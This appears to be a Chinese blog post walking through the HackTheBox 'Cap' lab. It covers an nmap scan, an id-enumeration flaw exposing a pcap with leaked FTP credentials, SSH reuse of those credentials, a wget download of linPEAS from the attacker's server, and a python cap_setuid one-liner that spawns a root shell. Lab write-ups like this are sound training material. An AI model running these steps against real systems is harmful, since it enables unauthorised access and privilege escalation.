---
title: HackTheBox记录01
published: 2026-06-18T18:00:00
description: hackthebox靶场记录
tags:
  - HackTheBox
category: 网络安全
draft: false
---

# 靶场通关记录

# 靶场：Cap(Linux)

## Task 1

How many TCP ports are open?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.5.250
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-18 06:54 -0400
Nmap scan report for 10.129.5.250
Host is up (0.21s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

answer：3

## Task 2

After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

访问页面之后，是一个网络抓包分析系统，在导航栏找到Security Snapshot (5 Second PCAP + Analysis)，点进去就会发现url是这样的：`http://10.129.5.250/data/1`

answer：data

## Task 3

Are you able to get to other users' scans?

修改url中的`id`部分

answer：yes

## Task 4/5

What is the ID of the PCAP file that contains sensative data?

Which application layer protocol in the pcap file can the sensetive data be found in?

使用burp，在上一步骤手工测试了1-3是存在的，但是实际上使用burp爆破发现还有个0

sniper attack->给url中的id加变量符->payload type选numbers->从0开始

`data/0`和其他的数据包长度不同，于是修改url，将该抓包文件进行下载，使用wireshark分析，发现FTP协议存在账户密码泄露

`36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan`

`40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS Buck3tH4TF0RM3!`

Task 4 answer：0

Task 5 answer：FTP

## Task 6

We've managed to collect nathan's FTP password. On what other service does this password work?

这下就可以尝试一下ssh登录

```
──(kali㉿kali)-[~/Desktop]
└─$ ssh nathan@10.129.5.250
The authenticity of host '10.129.5.250 (10.129.5.250)' can't be established.
ED25519 key fingerprint is: SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.5.250' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nathan@10.129.5.250's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

```

成功登录，发现当前目录下就是user的flag

```
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt 
f3e11475bd7f5f631ab75ec33b38f431

```

answer：SSH

## Task 8

What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

那么接下来就需要提权root，拿到最后的flag了，需要借助到工具linPEAS

### **linPEAS**

**介绍**：

**用于在 Linux/Unix*/MacOS 主机上搜索提升权限的可能路径**

LinPEAS 使用颜色来指示每个部分的起始位置。但**它也使用颜色来识别潜在的配置错误**。

1. **红色/黄色**用于识别导致 PE 的配置（99% 确定）
2. 红色用于识别可能导致权限提升的可疑配置
3. 绿色用于表示已知良好的配置（根据名称而非内容判断！）
4. 蓝色用于：无 shell 的用户和已挂载的**设备**
5. 浅**青色**用于：使用 shell 的用户
6. 浅**洋红色**用于：当前用户名

其他还有参数介绍，详细可以看：[github.com/peass-ng/PEASS-ng/tree/master/linPEAS](linPEAS)

依旧攻击机启动一个web服务，使用目标机来下载linpeas，之后赋予权限并启动

对攻击机的操作：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.5.250 - - [18/Jun/2026 07:30:35] "GET /linpeas.sh HTTP/1.1" 200 -

```

对目标机的操作：

```
nathan@cap:~$ wget http://10.10.16.230/linpeas.sh
--2026-06-18 11:30:35--  http://10.10.16.230/linpeas.sh
Connecting to 10.10.16.230:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1063041 (1.0M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                100%[====================================>]   1.01M   971KB/s    in 1.1s    

2026-06-18 11:30:36 (971 KB/s) - ‘linpeas.sh’ saved [1063041/1063041]

nathan@cap:~$ ls
linpeas.sh  user.txt
nathan@cap:~$ chmod +x linpeas.sh
nathan@cap:~$ ./linpeas.sh

```

扫描发现有一处标红部分，一般颜色比较突出的就是可利用部分

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

```

可以发现python3.8有特殊权限利用这个提权，可以设置uid为0（root的uid通常为0），然后去执行bash

```
nathan@cap:~$ python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
root@cap:~# ls
linpeas.sh  snap  user.txt
root@cap:~# cat /root/root.txt 
640bbd78aa4c1f8e97c799598d3f3205

```

Task 8 answer：/usr/bin/python3.8

Nathan answer：f3e11475bd7f5f631ab75ec33b38f431

Root answer：640bbd78aa4c1f8e97c799598d3f3205
